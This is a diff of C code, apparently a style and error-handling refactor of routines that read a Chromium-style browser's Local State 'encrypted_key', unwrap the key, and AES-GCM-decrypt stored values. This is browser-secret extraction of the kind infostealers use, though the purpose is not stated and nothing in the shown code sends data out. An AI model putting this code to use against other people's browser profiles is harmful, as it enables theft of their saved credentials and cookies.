@@ -24,11 +24,14 @@ AbeAeadOpen(
     BCRYPT_ALG_HANDLE Alg = NULL;
     BCRYPT_KEY_HANDLE Cipher = NULL;
     static BYTE Object[1024];
-    ULONG ObjLen = 0, Done = 0, Result = 0;
+    ULONG ObjLen, Done, Result;
     NTSTATUS Status;
 
     Status = BCryptOpenAlgorithmProvider(&Alg, Algorithm, NULL, 0);
-    if (!NT_SUCCESS(Status)) return Status;
+    if (!NT_SUCCESS(Status))
+    {
+        return Status;
+    }
     Status = BCryptSetProperty(Alg,
                                BCRYPT_CHAINING_MODE,
                                (PUCHAR)ChainingMode,
@@ -36,8 +39,7 @@ AbeAeadOpen(
                                0);
     if (!NT_SUCCESS(Status))
     {
-        BCryptCloseAlgorithmProvider(Alg, 0);
-        return Status;
+        goto _Exit;
     }
     Status = BCryptGetProperty(Alg,
                                BCRYPT_OBJECT_LENGTH,
@@ -47,8 +49,8 @@ AbeAeadOpen(
                                0);
     if (!NT_SUCCESS(Status) || ObjLen > sizeof(Object))
     {
-        BCryptCloseAlgorithmProvider(Alg, 0);
-        return !NT_SUCCESS(Status) ? Status : STATUS_INSUFFICIENT_RESOURCES;
+        Status = !NT_SUCCESS(Status) ? Status : STATUS_INSUFFICIENT_RESOURCES;
+        goto _Exit;
     }
     Status = BCryptGenerateSymmetricKey(Alg, &Cipher, Object, ObjLen, (PUCHAR)Key, 32, 0);
     if (NT_SUCCESS(Status))
@@ -69,7 +71,12 @@ AbeAeadOpen(
                                &Result,
                                0);
     }
-    if (Cipher != NULL) BCryptDestroyKey(Cipher);
+
+_Exit:
+    if (Cipher != NULL)
+    {
+        BCryptDestroyKey(Cipher);
+    }
     BCryptCloseAlgorithmProvider(Alg, 0);
     return Status;
 }
@@ -119,7 +126,10 @@ AbeGcmDecrypt(
     _In_ DWORD Length,
     _Out_writes_bytes_(Length) PBYTE Plain)
 {
-    if (Length <= 3 + 12 + 16) return STATUS_DATA_ERROR;
+    if (Length <= 3 + 12 + 16)
+    {
+        return STATUS_DATA_ERROR;
+    }
     return AbeAesGcmOpen(Key,
                          Value + 3,
                          Value + 15,
@@ -130,13 +140,14 @@ AbeGcmDecrypt(
 
 /*** Local State os_crypt blobs ***/
 
+_Success_(return)
 BOOL
 AbeReadOsCryptBlob(
     _In_z_ PCWSTR UserDataDir,
     _In_z_ PCWSTR Field,
     _Out_writes_bytes_(BlobSize) PBYTE Blob,
     _In_ ULONG BlobSize,
-    _Inout_ PDWORD BlobLength)
+    _Inout_ PULONG BlobLength)
 {
     IJsonValue* Root = NULL;
     IJsonObject* RootObject = NULL, * OsCrypt = NULL;
@@ -164,34 +175,44 @@ AbeReadOsCryptBlob(
         goto Cleanup;
     }
     Wide = _Inline_WindowsGetStringRawBuffer(Value, NULL);
-    if (CryptStringToBinaryW(Wide,
-                             0,
-                             CRYPT_STRING_BASE64,
-                             Blob,
-                             BlobLength,
-                             NULL,
-                             NULL))
-    {
-        Ok = TRUE;
-    }
+    Ok = CryptStringToBinaryW(Wide,
+                              0,
+                              CRYPT_STRING_BASE64,
+                              Blob,
+                              BlobLength,
+                              NULL,
+                              NULL);
 
 Cleanup:
-    if (Value != NULL) _Inline_WindowsDeleteString(Value);
-    if (OsCrypt != NULL) OsCrypt->lpVtbl->Release(OsCrypt);
-    if (RootObject != NULL) RootObject->lpVtbl->Release(RootObject);
-    if (Root != NULL) Root->lpVtbl->Release(Root);
+    if (Value != NULL)
+    {
+        _Inline_WindowsDeleteString(Value);
+    }
+    if (OsCrypt != NULL)
+    {
+        OsCrypt->lpVtbl->Release(OsCrypt);
+    }
+    if (RootObject != NULL)
+    {
+        RootObject->lpVtbl->Release(RootObject);
+    }
+    if (Root != NULL)
+    {
+        Root->lpVtbl->Release(Root);
+    }
     return Ok;
 }
 
+_Success_(return)
 BOOL
 AbeGetV10Key(
     _In_ const NET_BROWSER_INFO* Browser,
     _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
 {
     static BYTE Blob[2048];
-    DATA_BLOB In, Out = { 0 };
-    DWORD BlobLength = sizeof(Blob);
-    BOOL Ok = FALSE;
+    DATA_BLOB In, Out = { 0 };          /* Out is freed on failure paths */
+    ULONG BlobLength = sizeof(Blob);    /* in/out capacity */
+    BOOL Ok;
 
     if (!AbeReadOsCryptBlob(Browser->UserDataDir,
                             L"encrypted_key",
